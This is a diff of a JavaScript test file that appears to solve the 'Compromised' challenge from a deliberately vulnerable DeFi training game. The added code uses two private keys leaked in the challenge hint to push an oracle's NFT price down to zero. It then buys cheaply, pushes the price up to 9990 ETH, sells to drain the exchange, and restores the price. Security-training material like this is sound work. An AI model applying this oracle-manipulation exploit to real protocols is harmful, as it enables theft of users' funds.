@@ -61,6 +61,50 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        //private keys from the hint
+        const privateKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const privateKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        const token = await this.nftToken.connect(attacker);
+        const symbol = await token.symbol();
+
+        const source1 = new ethers.Wallet(privateKey1, ethers.provider);
+        const source2 = new ethers.Wallet(privateKey2, ethers.provider);
+
+        const oracle1 = await this.oracle.connect(source1);
+        const oracle2 = await this.oracle.connect(source2);
+
+        let tx1 = await oracle1.postPrice(symbol,ethers.utils.parseEther("0"));
+        let tx2 = await oracle2.postPrice(symbol,ethers.utils.parseEther("0"));
+
+        const exchange = await this.exchange.connect(attacker);
+
+        await tx1.wait();
+        await tx2.wait();
+
+        const tokenId = (await exchange.callStatic.buyOne({value:1})).toString()
+
+        const buyTx = await exchange.buyOne({value:1});
+
+        await buyTx.wait();
+
+        tx1 = await oracle1.postPrice(symbol,ethers.utils.parseEther("9990"));
+        tx2 = await oracle2.postPrice(symbol,ethers.utils.parseEther("9990"));
+
+        await tx1.wait();
+        await tx2.wait();
+
+        let tx = await token.approve(exchange.address, tokenId);
+
+        await tx.wait();
+
+        let sellTx = await exchange.sellOne(tokenId);
+        await sellTx.wait();
+
+        tx1 = await oracle1.postPrice(symbol,INITIAL_NFT_PRICE);
+        tx2 = await oracle2.postPrice(symbol,INITIAL_NFT_PRICE);
+
+        await tx1.wait();
+        await tx2.wait();
     });
 
     after(async function () {
